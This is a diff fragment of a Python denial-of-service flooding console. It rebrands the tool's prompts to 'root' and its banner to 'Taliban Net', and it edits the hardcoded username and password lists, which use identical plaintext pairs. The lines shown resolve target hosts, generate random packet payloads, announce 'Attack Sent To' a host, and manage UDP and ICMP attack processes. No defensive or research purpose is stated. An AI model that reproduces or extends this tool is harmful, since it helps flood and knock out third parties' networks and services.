-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1947,13 +1971,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1961,7 +1985,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1972,7 +1996,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1980,13 +2004,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1998,7 +2022,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -2006,13 +2030,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -2020,7 +2044,7 @@ def main():
 
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot↣\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()
 
@@ -2032,7 +2056,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot↣\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -2040,13 +2064,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot↣\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot↣\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -2054,7 +2078,7 @@ def main():
 
 			if username == "Guest":
 
-				print ("[\033[91mReaper\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot↣\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()
 
@@ -2066,7 +2090,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot↣\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -2074,13 +2098,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot↣\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot↣\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -2092,7 +2116,7 @@ def main():
 
 				socket.gethostbyname(host)
 
-				print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+				print ("[\033[91mroot↣\033[00m] Attack Sent To: {}\n".format (host))
 
 				punch = random._urandom(int(pack))
 
@@ -2100,19 +2124,19 @@ def main():
 
 			except ValueError:
 
-				print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+				print ("[\033[91mroot↣\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 				main()
 
 			except socket.gaierror:
 
-				print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+				print ("[\033[91mroot↣\033[00m] Host: {} Invalid.\n".format (host))
 
 				main()
 
 		elif sinput == "stop":
 
-			print ("[\033[91mReaper\033[00m] All Running Attacks Have Been Stopped.\n")
+			print ("[\033[91mroot↣\033[00m] All Running Attacks Have Been Stopped.\n")
 
 			attack = False
 
@@ -2136,7 +2160,7 @@ def main():
 
 					if aid == 0:
 
-						print ("[\033[91mReaper\033[00m] No UDP Processes Running.")
+						print ("[\033[91mroot↣\033[00m] No UDP Processes Running.")
 
 						udp = True
 
@@ -2150,7 +2174,7 @@ def main():
 
 				while not icmp:
 
-					print ("[\033[91mReaper\033[00m] No ICMP Processes Running.")
+					print ("[\033[91mroot↣\033[00m] No ICMP Processes Running.")
 
 					udp = True
 
@@ -2158,84 +2182,100 @@ def main():
 
 		else:
 
-			print ("[\033[91mReaper\033[00m] {} Is Not A Command.\n".format(sinput))
+			print ("[\033[91mroot↣\033[00m] {} Is Not A Command.\n".format(sinput))
 
 			main()
 
 try:
-	users = ["Reaper", "Guest", "zode", "mort", "walker"]
+	users = ["admin", "Guest", "zode", "mort", "killer", "walker"]
 	clear = "clear"
 	os.system (clear)
-	username = getpass.getpass ("[+] Username: ")
+	username = getpass.getpass ("Enter Your Username: ")
 	if username in users:
 		user = username
 	else:
-		print ("[+] Incorrect, Exiting.\n")
+		print ("Sorry That Username Was Invalid Exiting.\n")
 		exit()
 except KeyboardInterrupt:
 	exit()
 try:
-	passwords = ["Reaper", "Guest", "zode", "mort", "walker"]
-	password = getpass.getpass ("[+] Password: ")
-	if user == "Reaper":
+	passwords = ["admin", "Guest", "zode", "mort", "killer", "walker"]
+	password = getpass.getpass ("Enter Your Password: ")
+	if user == "admin":
 		if password == passwords[0]:
-			print ("[+] Login Correct.")
-			print ("[+] Please wait.")
+			print ("Login Correct.")
+			print ("Please Wait while We Load Taliban Net")
 			cookie.write("DIE")
-			time.sleep(3)
+			time.sleep(1)
 			os.system (clear)
 			try:
 				os.system ("clear")
-				print (banner)
+				print (welcome)
 				main()
 			except KeyboardInterrupt:
-				print ("\n[\033[91mReaper\033[00m] Ctrl-C Has Been Pressed.\n")
+				print ("\n[\033[91mUser\033[00m] Ctrl-C Has Been Pressed.\n")
 				main()
 		else:
-			print ("[+] Incorrect, Exiting.\n")
+			print ("Sorry That Password Was Invalid Exiting.\n")
 			exit()
 	if user == "zode":
-			print ("[+] Login Correct.")
-			print ("[+] Please wait.")
+		if password == passwords[2]:
+			print ("Login Correct.")
+			print ("Please Wait while We Load Taliban Net")
 			cookie.write("DIE")
 			time.sleep(3)
 			os.system (clear)
 			try:
 				os.system ("clear")
-				print (banner)
+				print (welcome)
 				main()
 			except KeyboardInterrupt:
-				print ("\n[\033[91mzode\033[00m] Ctrl-C Has Been Pressed.\n")
+				print ("\n[\033[91mUser\033[00m] Ctrl-C Has Been Pressed.\n")
 				main()
-	elif user == "mort":
-			print ("[+] Login Correct.")
-			print ("[+] Please wait.")
+	if user == "mort":
+		if password == passwords[3]:
+			print ("Login Correct.")
+			print ("Please Wait while We Load Taliban Net")
 			cookie.write("DIE")
 			time.sleep(3)
 			os.system (clear)
 			try:
 				os.system ("clear")
-				print (banner)
+				print (welcome)
 				main()
 			except KeyboardInterrupt:
-				print ("\n[\033[91mReaper\033[00m] Ctrl-C Has Been Pressed.\n")
+				print ("\n[\033[91mUser\033[00m] Ctrl-C Has Been Pressed.\n")
+				main()
+	if user == "killer":
+		if password == passwords[4]:
+			print ("Login Correct.")
+			print ("Please Wait while We Load Taliban Net")
+			cookie.write("DIE")
+			time.sleep(3)
+			os.system (clear)
+			try:
+				os.system ("clear")
+				print (welcome)
+				main()
+			except KeyboardInterrupt:
+				print ("\n[\033[91mUser\033[00m] Ctrl-C Has Been Pressed.\n")
 				main()
 	if user == "walker":
-		if password == passwords[4]:
-			print ("[+] Login Correct.")
-			print ("[+] Certain Methods Will Not Be Available To You.")
-			print ("[+] Please Wait.")
-			time.sleep(5)
+		if password == passwords[5]:
+			print ("Login Correct.")
+			print ("Certain Methods Will Not Be Available To You.")
+			print ("Please Wait while We Load Taliban Net")
+			time.sleep(3)
 			os.system (clear)
 			try:
 				os.system ("clear")
-				print (banner)
+				print (welcome)
 				main()
 			except KeyboardInterrupt:
-				print ("\n[\033[91mReaper\033[00m] Ctrl-C Has Been Pressed.\n")
+				print ("\n[\033[91mUser\033[00m] Ctrl-C Has Been Pressed.\n")
 				main()
 		else:
-			print ("[+] Incorrect, Exiting.\n")
+			print ("Sorry That Login Was Invalid Exiting.\n")
 			exit()
 except KeyboardInterrupt:
 	exit()
